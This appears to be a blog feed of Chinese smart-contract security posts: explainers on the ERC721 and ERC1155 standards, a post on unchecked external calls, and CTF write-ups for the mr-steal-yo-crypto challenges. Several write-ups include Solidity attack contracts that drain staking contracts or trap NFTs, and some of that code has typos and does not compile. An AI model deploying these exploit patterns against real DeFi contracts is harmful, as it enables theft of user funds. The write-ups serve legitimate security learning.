        <content type="html"><![CDATA[<h1 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h1><p>非同质代币标准</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>非同质化代币（NFT）用于以唯一的方式标识某人或者某物。 此类型的代币可以被完美地用于出售下列物品的平台：收藏品、密钥、彩票、音乐会座位编号、体育比赛等。 这种类型的代币有着惊人的潜力，因此它需要一个适当的标准。ERC-721 就是为解决这个问题而来！</p><p>ERC-721 为 NFT 引入了一个标准，换言之，这种类型的代币是独一无二的，并且可能与来自同一智能合约的另一代币有不同的价值，也许是因为它的年份、稀有性、甚至是它的观感。</p><p>是的。 所有 NFTs 都有一个 uint256 变量，名为 tokenId，所以对于任何 ERC-721 合约，这对值contract address, tokenId 必须是全局唯一的。 也就是说，去中心化应用程序可以有一个“转换器”， 使用 tokenId 作为输入并输出一些很酷的事物图像，例如僵尸、武器、技能或神奇的小猫咪！</p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>协议函数如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function balanceOf(address _owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">function ownerOf(uint256 _tokenId) external view returns (address);</span><br><span class="line">//注意发送的tokenid，没有数量</span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br><span class="line"></span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function approve(address _approved, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function setApprovalForAll(address _operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">function getApproved(uint256 _tokenId) external view returns (address);</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(address _owner, address _operator) external view returns (bool);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明：<br>balanceOf(): 返回由_owner 持有的NFTs的数量。</p><p>ownerOf(): 返回tokenId代币持有者的地址。</p><p>approve(): 授予地址_to具有_tokenId的控制权，方法成功后需触发Approval 事件。</p><p>setApprovalForAll(): 授予地址_operator具有所有NFTs的控制权，成功后需触发ApprovalForAll事件。</p><p>getApproved()、isApprovedForAll(): 用来查询授权。</p><p>safeTransferFrom(): 转移NFT所有权，一次成功的转移操作必须发起 Transer 事件。函数的实现需要做一下几种检查：</p><ul><li>调用者msg.sender应该是当前tokenId的所有者或被授权的地址</li><li>_from 必须是 _tokenId的所有者</li><li>_tokenId 应该是当前合约正在监测的NFTs 中的任何一个</li><li>_to 地址不应该为 0，如果_to 是一个合约应该调用其onERC721Received方法, 并且检查其返回值，如果返回值不为bytes4(keccak256(“onERC721Received(address,uint256,bytes)”))抛出异常。<br>一个可接收NFT的合约必须实现ERC721TokenReceiver接口：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface ERC721TokenReceiver &#123;</span><br><span class="line">    /// @return `bytes4(keccak256(&quot;onERC721Received(address,uint256,bytes)&quot;))`</span><br><span class="line">    function onERC721Received(address _from, uint256 _tokenId, bytes data) external returns(bytes4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>transferFrom(): 用来转移NFTs, 方法成功后需触发Transfer事件。调用者自己确认_to地址能正常接收NFT，否则将丢失此NFT。此函数实现时需要检查上面条件的前4条。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-nft-bonanza</title>
      <link href="/2024/10/25/CTF-nft-bonanza/"/>
      <url>/2024/10/25/CTF-nft-bonanza/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-ntf-bonanza"><a href="#CTF-ntf-bonanza" class="headerlink" title="CTF-ntf-bonanza"></a>CTF-ntf-bonanza</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/nft-bonanza">点击</a></p><p>要求是：新的 NFT 交易合约 BonanzaMarketplace 已经推出，它允许交易选定的白名单 ERC721 和 ERC1155 代币。您的挑战是获得所有列出的 NFT。</p><p>根据源码，可以发现此时的NTF都是ERC721代币，所以了解ERC721非同质化代币标准，会很好的理解。</p><p>要获得所列的NTF，就先看看，buyItem函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buyItem(</span><br><span class="line">       address _nftAddress,</span><br><span class="line">       uint256 _tokenId,</span><br><span class="line">       address _owner,</span><br><span class="line">       uint256 _quantity</span><br><span class="line">   )</span><br><span class="line">       external</span><br><span class="line">       nonReentrant</span><br><span class="line">       isListed(_nftAddress, _tokenId, _owner)</span><br><span class="line">       validListing(_nftAddress, _tokenId, _owner)</span><br><span class="line">   &#123;</span><br><span class="line">       require(_msgSender() != _owner, &quot;Cannot buy your own item&quot;);</span><br><span class="line"></span><br><span class="line">       Listing memory listedItem = listings[_nftAddress][_tokenId][_owner];</span><br><span class="line">       require(listedItem.quantity &gt;= _quantity, &quot;not enough quantity&quot;);</span><br><span class="line"></span><br><span class="line">       // Transfer NFT to buyer</span><br><span class="line">       if (IERC165(_nftAddress).supportsInterface(INTERFACE_ID_ERC721)) &#123;</span><br><span class="line">           IERC721(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           IERC1155(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId, _quantity, bytes(&quot;&quot;));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (listedItem.quantity == _quantity) &#123;</span><br><span class="line">           delete (listings[_nftAddress][_tokenId][_owner]);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           listings[_nftAddress][_tokenId][_owner].quantity -= _quantity;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       emit ItemSold(</span><br><span class="line">           _owner,</span><br><span class="line">           _msgSender(),</span><br><span class="line">           _nftAddress,</span><br><span class="line">           _tokenId,</span><br><span class="line">           _quantity,</span><br><span class="line">           listedItem.pricePerItem</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       _buyItem(listedItem.pricePerItem, _quantity, _owner);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function _buyItem(</span><br><span class="line">       uint256 _pricePerItem,</span><br><span class="line">       uint256 _quantity,</span><br><span class="line">       address _owner</span><br><span class="line">   ) internal &#123;</span><br><span class="line">       uint256 totalPrice = _pricePerItem * _quantity;</span><br><span class="line">       uint256 feeAmount = totalPrice * fee / BASIS_POINTS;</span><br><span class="line">       IERC20(paymentToken).safeTransferFrom(_msgSender(), feeReceipient, feeAmount);</span><br><span class="line">       IERC20(paymentToken).safeTransferFrom(_msgSender(), _owner, totalPrice - feeAmount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>从上我们可以看到，并没有对购买数量quantity的检查，所以即使购买零个NTF也是可以的，重点来了，在ERC721代币标准中，对于购买数量并没有要求，还是会发送tokenId给购买者，这就是漏洞所在</p><p>攻击思路：直接调用buyItem函数，购买零个ERC721代币标准的NTF就可以了</p><p>个人认为，这个题就是疏忽了ERC721代币的执行标准，所以对于一些主流协议，还是必须的了解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可怕的外部调用？</title>
      <link href="/2024/10/25/%E5%8F%AF%E6%80%95%E7%9A%84%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%EF%BC%9F/"/>
      <url>/2024/10/25/%E5%8F%AF%E6%80%95%E7%9A%84%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>往往对于一个功能成熟的<code>DAPP</code>，如uniswapV2,多签钱包等，都是通过多个智能合约实现的，那么就多多少少都会涉及到外部的调用，然而这就带来的很大的风险。如果不能确保外部调用的合约是正常且不带恶意逻辑代码，那么对自身合约就是个定时炸弹，不知道哪天就调用了一个不正常的恶意合约，引爆炸弹。</p><p>外部调用会引发的一些常见漏洞：重入攻击，外部合约的安全性问题，重放攻击等</p><p>具体来看一下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(</span><br><span class="line">       uint256 farmDeposit,</span><br><span class="line">       address payable from,</span><br><span class="line">       address to</span><br><span class="line">   ) external returns (uint256 shares) &#123;</span><br><span class="line">       require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);</span><br><span class="line">       require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);</span><br><span class="line">       require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);</span><br><span class="line"></span><br><span class="line">       shares = farmDeposit;</span><br><span class="line">       if (xfarm.totalSupply() != 0) &#123;</span><br><span class="line">           uint256 farmBalance = farm.balanceOf(address(this));</span><br><span class="line">           shares = (shares * xfarm.totalSupply()) / farmBalance;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (isContract(from)) &#123;</span><br><span class="line">           require(IAdvisor(from).owner() == msg.sender); // admin</span><br><span class="line">           IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           require(from == msg.sender); // user</span><br><span class="line">           farm.safeTransferFrom(from, address(this), farmDeposit);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       xfarm.mint(to, shares);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这是一个质押合约 RewardsAdvisor中的部分代码，它接受 FARM 代币并铸造等量的 xFARM。xFARM 用于治理defi 生态系统。<br>通过以上代码。我们发现当质押合约接受xFARM时，如果对面是合约A，不是外部账户，那么质押合约就会调用这个合约A的delegatedTransferERC20，来进行代币的转移，可是，质押合约并没有对转移后代币数量的检查等，所以，合约A中delegatedTransferERC20函数如果什么也没有实现，质押合约也会认为代币接受成功了，这将会引起一个可怕的后果。</p><p>同样。也有以下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function stakeFor(address _for, uint256 _amount) public &#123;</span><br><span class="line">    require(_amount &gt; 0, &quot;Cannot stake 0&quot;);</span><br><span class="line">    </span><br><span class="line">    // pull tokens and apply stake</span><br><span class="line">    stakingToken.safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    _applyStake(_for, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是一个质押合约中的部分代码，进行外部调用  <code>stakingToken.safeTransferFrom(msg.sender, address(this))</code>,都是没有对调用后进行一个检查，攻击者就可以乘虚而入，如：TempleDAO 的 STAX 在2022年就因为同样的原因被黑客入侵，损失了价值约 $2.3M 的 LP 代币。再者就是Visor合约(实现铸造无限奖励)，黑客通过利用同样的原理实现了经济套利，铸造了 195k 个 vVISR 代币。然后，这些被<code>burn</code>为 8.8M VISR，通过 Uniswap v2 交换为 ETH，获得了113 ETH（450 美元）。<a href="https://rekt.news/templedao-rekt/">案例1参考</a> <a href="https://rekt.news/visor-finance-rekt/">案例2参考</a></p><p>但是，外部调用并不可怕，您可以通过以下措施来防范：<br>1，使用状态变量控制，在执行外部调用之前先更新合约状态，防止重入攻击。<br>2，采用检查-效果-交互模式，将合约操作分为三个阶段，确保在外部调用前完成所有状态更新。<br>3，实现重入保护，使用互斥锁（例如 nonReentrant 修饰符）来防止重入攻击。<br>4，通过权限控制，确保只有经过授权的用户可以执行特定操作，使用 Ownable 或类似的库来管理权限。<br>5，使用受信任的外部合约，在与其他合约交互时，确保只与信誉良好的合约交互，避免不必要的风险。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-freebie</title>
      <link href="/2024/10/24/CTF-freebie/"/>
      <url>/2024/10/24/CTF-freebie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-freebie"><a href="#CTF-freebie" class="headerlink" title="CTF-freebie"></a>CTF-freebie</h1><p> 题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/freebie">点击</a></p><p> 这道题，怎么说，和昨天写的那个<a href="CTF-tasty-stake.md">CTF-tasty-stake</a>的漏洞原理一样</p><p> 看到这段代码，经典的委托调用，只不过这次又是不实现它</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(</span><br><span class="line">        uint256 farmDeposit,</span><br><span class="line">        address payable from,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256 shares) &#123;</span><br><span class="line">        require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);</span><br><span class="line">        require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);</span><br><span class="line">        require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);</span><br><span class="line"></span><br><span class="line">        shares = farmDeposit;</span><br><span class="line">        if (xfarm.totalSupply() != 0) &#123;</span><br><span class="line">            uint256 farmBalance = farm.balanceOf(address(this));</span><br><span class="line">            shares = (shares * xfarm.totalSupply()) / farmBalance;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (isContract(from)) &#123;</span><br><span class="line">            require(IAdvisor(from).owner() == msg.sender); // admin</span><br><span class="line">            IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            require(from == msg.sender); // user</span><br><span class="line">            farm.safeTransferFrom(from, address(this), farmDeposit);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        xfarm.mint(to, shares);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数实现的是存款合约，存入代币后，就可以获得股份，存入越多，获得的就越多。</p><p>然而又是一个对外部调用，没有检查。</p><p>攻击合约如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IRewardsAdvisor &#123;</span><br><span class="line">    function withdraw(</span><br><span class="line">        uint256 shares,</span><br><span class="line">        address to,</span><br><span class="line">        address payable from</span><br><span class="line">    ) external returns (uint256 rewards);</span><br><span class="line"></span><br><span class="line">    function deposit(</span><br><span class="line">        uint256 farmDeposit,</span><br><span class="line">        address payable from,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256 shares);</span><br><span class="line">&#125;</span><br><span class="line">contract Hack&#123;</span><br><span class="line"></span><br><span class="line">    IRewardsAdvisor rewardsAdvisor;</span><br><span class="line"></span><br><span class="line">    constructor(address _rewardsAdvisor) &#123;</span><br><span class="line">        rewardsAdvisor = IRewardsAdvisor(_rewardsAdvisor);</span><br><span class="line">    &#125;</span><br><span class="line">  //不实现这个功能--欺骗</span><br><span class="line">    function delegatedTransferERC20(address token, address to, uint256 amount) external &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function runExploit() external &#123;</span><br><span class="line">        uint256 depositAmount = 1e18 * 1e18; //大量的FARM</span><br><span class="line">        uint256 shares = rewardsAdvisor.deposit(depositAmount, payable(address(this)), address(this));</span><br><span class="line"></span><br><span class="line">        rewardsAdvisor.withdraw(shares, msg.sender, payable(address(this))); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击思路：首先使用攻击合约调用deposit函数，存入大量的代币，然后接收方回调攻击合约的delegatedTransferERC20函数，向实现把代币转入。但是，攻击合约没有实现这delegatedTransferERC20个功能，而被攻击的合约也并没有检查，所以就给攻击合约大量的股份，最后再实现withdraw函数功能，将攻击者合约中的xFARM，转换回 FARM,再转移给攻击者自己。</p><p>个人认为，外部调用，要进行检查，严格的审查是否实现了合理的要求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-tasty-stake</title>
      <link href="/2024/10/23/CTF-tasty-stake/"/>
      <url>/2024/10/23/CTF-tasty-stake/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-tasty-stake"><a href="#CTF-tasty-stake" class="headerlink" title="CTF-tasty-stake"></a>CTF-tasty-stake</h1><p>题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/tasty-stake">点击</a></p><p>题目要求： 有个TastyStaking 合约，该合约允许您质押 STEAK 以种植 BUTTER 代币。您的任务是从质押合约中耗尽所有 STEAK 代币。</p><p>首先这个合约是个单合约，实现的功能的挺多的，阅读了很久，看了一下它的提示：所有输入都经过了适当的验证吗？</p><p>看来又是参数有问题，来到合约最后，migrateStake合约实现的代币质押的转移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function migrateStake(address oldStaking, uint256 amount) external &#123;</span><br><span class="line">        TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);</span><br><span class="line">        _applyStake(msg.sender, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是关键来了。对于这个oldStaking,这个函数并没有有什么检查举动，回想前几天刚做的Safu Valut题，和它有点类似，都是没有对外部调用进行一个检查，那么这个题旧很好的解决了</p><p>攻击合约：</p><pre><code>contract Attack &#123;     address owner;     TastyStaking _tastyStaking;     Token stakingToken;     constructor(address _target, address _stakingToken)       &#123;         attacker = msg.sender;         _tastyStaking = TastyStaking(_target);          stakingToken = Token(_stakingToken);        &#125;     function migrateWithdraw(address staker, uint256 amount) externa&#123; &#125;         function pwn() external &#123;        //传入的攻击合约的地址，也就是旧地址，         _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));          _tastyStaking.withdrawAll(false);          stakingToken.transfer(attacker, stakingToken.balanceOf(address(this)));          &#125; &#125;这个逻辑就是，攻击合约伪装成旧抵押合约地址，取得TastyStaking合约的信任后，再执行的withdrawall函数具体：攻击者伪装成旧合约地址调用TastyStaking合约中的migrateStake函数，然后TastyStaking合约接受到转移的信号，又去旧合约中调用migrateWithdraw函数，提取被转移的代币，但是攻击合约并没有实现migrateWithdraw函数的功能，而TastyStaking合约也没有进行验证，就误以为收到转移的代币，实际没有。这样攻击合约取得了信任，然后就调用TastyStaking合约中withdrawall函数，获得了TastyStaking合约中的所有代币。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-safu-wallet</title>
      <link href="/2024/10/23/CTF-safu-wallet/"/>
      <url>/2024/10/23/CTF-safu-wallet/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-safu-wallet"><a href="#CTF-safu-wallet" class="headerlink" title="CTF-safu-wallet"></a>CTF-safu-wallet</h1><p>题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-wallet">点击</a>。</p><p>题目要求：这是一个多签名钱包，已经有一位顾客存入钱，然后你要将它的钱永远困住在这个钱包里</p><p>首先看到合约代码：很清晰的辨别了，SafuWallet合约是代理合约，SafuWalletLibrary合约是逻辑合约，这样分开，就好理解了<br>对于多签名钱包，我的理解就是，不止一个管理员，至少要俩个管理员就可以管理这个钱包了。</p><p>逻辑合约里有kill函数，如果能调用，这应该是最便捷的解题方式了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function kill(address _to) onlymanyowners(sha3(msg.data)) external &#123;</span><br><span class="line">    suicide(_to);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>很遗憾的是，有个<code>onlymanyowners</code>限制，这也就是多签名钱包的魅力了吧。</p><p>看到代理合约中，构造函数还是有点东西。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor(address[] memory _owners, uint _required, uint _daylimit) &#123;</span><br><span class="line">   bytes memory data = abi.encodeWithSignature(</span><br><span class="line">     &quot;initWallet(address[],uint256,uint256)&quot;,</span><br><span class="line">     _owners,</span><br><span class="line">     _required,</span><br><span class="line">     _daylimit</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   _safuWalletLibrary.functionDelegateCall(data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>又是熟悉的<code>delegatecall</code>,代理合约委托调用了逻辑合约里的initWallet函数，执行环境是在代理合约，改变的状态变量也是在代理合约中，也就是说在代理合约中，这个所有者是可以改变的，如果只有我们自己，那么就可以成为多签名钱包的唯一所有者，然后再调用逻辑合约里的kill函数，传入代理合约的地址，销毁它，这样就不需要其他人的所有者的同意，就可以销毁，那位存钱的人，想要取钱，是不行的。</p><p>还有一种情况就是把所有者列表都设置为空，然后再调用kill函数时就没有任何所有者确认了。</p><p>攻击思路：<br>改变所有者的列表，将他们设置为空。调用<code>safuWalletLibrary.initWallet(addresses(0), 1, type(uint).max)</code>,设置要求，只需要一个确认就可以执行操作。最后调用kill函数，即可。</p><p>个人认为：就是逻辑合约里的kill函数没有任何限制，只要所有者列表为空，或者攻击者成为了所有者，都可以调用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-free-Lunch</title>
      <link href="/2024/10/23/CTF-free-Lunch/"/>
      <url>/2024/10/23/CTF-free-Lunch/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-free-Lunch"><a href="#CTF-free-Lunch" class="headerlink" title="CTF-free-Lunch"></a>CTF-free-Lunch</h1><p>题目来源：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/free-lunch">点击</a></p><p>首先这个代币只有一个合约，还是容易理解。如果对<code>unswap V2</code>有了解的话，会更好的理解合约。发现漏洞。<br>要了解流动池<a href="https://www.binance.com/zh-CN/square/post/139279">点击</a>,</p><p>题目要求是：我们初始有俩个代币，让我们通过这个SafuMaker合约后，翻倍50，并且要耗尽这个合约的资金。</p><p>攻击流程（这道题没有思路，或者是说对流动性的了解太少了，看了测试合约，发现这个思路真的让我茅舍顿开，或者是，题目还是做少了）：</p><p>添加流动性并获得 LP 代币：</p><ul><li>攻击者首先向 SAFU-USDC 流动性池添加流动性，例如存入 10 USDC 和 10 SAFU。这一步使得攻击者获得相应数量的 LP 代币，代表他们在流动性池中的份额。</li></ul><p>创建新流动性池：</p><ul><li>攻击者使用获得的 LP 代币与 SAFU 代币创建一个新的流动性池。这一步增加了攻击者的流动性控制能力。</li></ul><p>转移 LP 代币并进行转换：</p><ul><li>攻击者将 10% 的新流动性池的 LP 代币转移到 safuMaker 合约，并调用其 convert 方法。这通常会激活一些机制，例如将 LP 代币转换为 SAFU 代币或其他奖励。</li></ul><p>代币交换：</p><ul><li>攻击者使用路由合约执行代币交换，将 SAFU 代币转换为 SAFU-Pair LP 代币。这一步骤允许攻击者利用价格差异获取更多的 LP 代币。</li></ul><p>移除流动性并提取资产：</p><ul><li>攻击者移除流动性池中的所有资产，这会将他们的 LP 代币转换为基础的 USDC 和 SAFU 代币。<br>由于在流动性池中不断进行交易、提供流动性以及获取奖励，攻击者的最终余最终余额大幅增加。</li></ul><p>攻击者成功的关键在于对流动性池机制的利用，通过不断添加流动性、转移 LP 代币和进行代币交换，攻击者能够有效增加其代币余额，最终实现经济利益的获取。</p><p>个人认为就像无中生有一样，更像一种欺骗，不过这样确实也能获利</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-game-assets</title>
      <link href="/2024/10/22/CTF-game-assets/"/>
      <url>/2024/10/22/CTF-game-assets/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-game-asserts"><a href="#CTF-game-asserts" class="headerlink" title="CTF-game-asserts"></a>CTF-game-asserts</h1><p>题目源码:<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/game-assets">点击</a></p><p>题目说明：GG labs 刚刚发布了他们的 nOtApOnZi 游戏，该游戏允许将多个 WLed NFT 用作游戏内物品。为了集成多个 ERC721 代币，他们有一个包装合约 （ERC1155） 来包装 NFT，允许它们在游戏中使用。用户也可以在使用完 NFT 后解包它们。您的任务是将用户的 NFT 困在包装合约中并使他们无法挽回，从而使用户感到悲伤</p><p>这个一实现了游戏里的资产转化，首先AssetHolder合约中，就是资产的说明，具体实现有点多，这里就不深究了，AssetWrapper合约就是我们重点要说的了，他是一个包装合约，因为这个游戏使用的ERC1155代币规则，所以在进行包装的时候，要对用户进行返回代币是，就会触发一个隐藏的接受函数，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">       address operator,</span><br><span class="line">       address from,</span><br><span class="line">       uint256[] calldata ids,</span><br><span class="line">       uint256[] calldata values,</span><br><span class="line">       bytes calldata data</span><br><span class="line">   ) external override returns (bytes4) &#123; &#125;</span><br></pre></td></tr></table></figure><p>bytes4返回值是固定的，如果就是在返回值这里动手脚了，那么包装就会不成功，资产就会被困住。</p><p>这个题要先去了解ERC1155代币标准，我自己对于这个ERC-1155的了解<a href="ERC1155.md">点击</a>,漏洞已在这里面说明，就是一个必须注意的地方，我觉得也是ERC1155的一个弊端吧</p><p>攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-Linsence-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^ 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface AssetWrapper &#123;</span><br><span class="line">    function wrap(uint256 nftId,address assetOwner,address assetAddress) external;</span><br><span class="line">    function unwrap (address assetOwner,address assetAddress) external ;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack is ERC1155Receiver&#123;</span><br><span class="line">          IAssetWrapper wrapper;</span><br><span class="line">          address attracker;</span><br><span class="line">           address nftAddress;</span><br><span class="line"></span><br><span class="line">           constructor(address _wrapper,address _attracker)&#123;</span><br><span class="line">            wrapper = IAssetWrapper(_wrapper);</span><br><span class="line">            attracker = attracker;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           function pwn(uint256 nftId,address assetAddress) exteranl&#123;</span><br><span class="line">             nftAddress = assetAddress;</span><br><span class="line">             wrapper.wrap(nftId,address(this),assetAddress);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           function onERC1155Received(address operator,address from,address id,uint256 value,bytes calldata)</span><br><span class="line">           exteranl returns(bytes4)&#123;</span><br><span class="line">             require(msg.sender == address(wrapper), &quot;invalid callback&quot;);</span><br><span class="line"></span><br><span class="line">               wrapper.unwrap(address(this), nftAddress); // change ownership to this contract</span><br><span class="line"></span><br><span class="line">                 return bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">           &#125;</span><br><span class="line">           function onERC1155BatchReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256[] calldata ids,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        return bytes4(0); // 返回了bytes(0),与本来标准不符合。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即可，个人认为这道题的考察点就是对ERC1155代币规则要熟悉。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC1155</title>
      <link href="/2024/10/22/ERC1155/"/>
      <url>/2024/10/22/ERC1155/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h1><p>多代币标准</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>用于多种代币管理的合约标准接口。 单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合。</p><p>多代币标准是什么？</p><p>它的目的很单纯，就是创建一个智能合约接口，可以代表和控制任何数量的同质化和非同质化代币类型。 这样一来，ERC-1155 代币就具有与 ERC-20 和 ERC-721 代币相同的功能，甚至可以同时使用这两者的功能。 它改进了 ERC-20 和 ERC-721 标准的功能，提升了效率并纠正了实现中的明显错误。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="批量传输"><a href="#批量传输" class="headerlink" title="批量传输"></a>批量传输</h3><p>通过一次合约调用传输多种资产</p><p>就是不单是一种代币可以传输，很多种代币都可以传输</p><p>来看看，他与ERC20传输合约的比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-20</span><br><span class="line">function transferFrom(address from, address to, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">// ERC-1155</span><br><span class="line">function safeBatchTransferFrom(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external;</span><br></pre></td></tr></table></figure><p>ERC-1155 中唯一的区别是我们将值作为数组传递，同时也传递了 ids 数组。 例如，给出 ids&#x3D;[3, 6, 13] 和 values&#x3D;[100, 200, 5]，传输结果将是</p><ul><li>将 id 3 的 100 个代币从 _from 传输到 _to。</li><li>将 id 6 的 200 个代币从 _from 传输到 _to。</li><li>将 id 13 的 5 个代币从 _from 转移到 _to。<br>在 ERC-1155 中，我们只有 transferFrom，没有 transfer。 要像常规的 transfer一样使用它，只需将 “from” 地址设为调用该函数的地址。</li></ul><h3 id="批量余额"><a href="#批量余额" class="headerlink" 